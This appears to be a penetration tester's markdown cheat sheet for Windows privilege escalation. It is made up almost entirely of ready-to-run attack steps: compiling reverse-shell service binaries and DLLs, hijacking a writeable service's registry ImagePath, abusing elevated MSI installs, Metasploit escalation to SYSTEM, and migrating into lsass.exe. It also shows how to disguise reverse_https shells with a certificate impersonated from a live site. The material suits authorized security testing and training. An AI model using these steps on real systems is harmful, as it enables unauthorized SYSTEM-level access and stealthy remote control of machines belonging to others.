# Privilege Escalation

## [⬅ Back to Index](../README.md)

---

## Windows

### Services

* Posh
  * Get all: `Get-WmiObject -Class Win32_Service|Format-Table -Property Name,DisplayName,PathName,StartMode`
  * Get specific service DACLs: `Get-Acl -Path hklm:\System\CurrentControlSet\services\`
* Injection to writeable service registry entry
  * `apt-get install gcc-mingw-w64`
  * `x86_64-w64-mingw32-gcc scripts/windows_service.c -o revshell.exe`
  * Copy `service.exe` to `C:\temp`
  * `reg add HKLM\SYSTEM\CurrentControlSet\services\service_with_access /v ImagePath /t REG_EXPAND_SZ /d c:\temp\revshell.exe /f`
  * `sc start service_with_access`
* Unquoted Service Paths
  * `sc qc <service-name>`
  * `wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows" | findstr /i /v """`

### DLLs

* Scan application DLLs for preloading attack: [Rattler](https://github.com/sensepost/rattler)
* Replace writeable DLL path with revshell
  * `apt-get install gcc-mingw-w64`
  * `x86_64-w64-mingw32-gcc scripts/windows_dll.c -shared -o revshell.dll`
  * Copy `revshell.dll` to path the service or app uses.
  * Restart service or open app that runs as higher privilege to trigger DLL load.

### Registry

* Check if msi modules run elevated: `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
  * If so, use `-f msi` for venom payloads.
  * `msiexec /quiet /qn /i revshell.msi`

### Metasploit

* `run post/multi/recon/local_exploit_suggester`
* `sessions -u #` - Attempt automatic escalation to `NT-AUTHORITY\SYSTEM`
* Windows Gather Privileges Enumeration Module - `post/windows/gather/win_privs`
* **All Reverse shells**
  * `setg InitialAutoRunScript migrate -n lsass.exe` - Auto stabilise (such as Services that fail to start and kills the initial stager)
    * Use `-f` on the above to auto create a process `notepad.exe` to utilise (although less inconspicuous)
* **SSL Reverse Shells**
  1. Use `gather/impersonate_ssl` to scrape a certificate from any live HTTPS site, e.g. google.com
  2. Build or use a payload with `reverse_https`
  3. `set handlersslcert ./` to the certificate location created from *Step 1*
  4. `set stagerverifysslcert true`
  5. `run`

### Hot Potato

* Posh module: <https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1>

### Find Exploits

* Suggest exploits for missing Windows KBs
  * Win 10: <https://github.com/rasta-mouse/Watson>
  * < Win 7: <https://github.com/rasta-mouse/Sherlock> (*Deprecated)
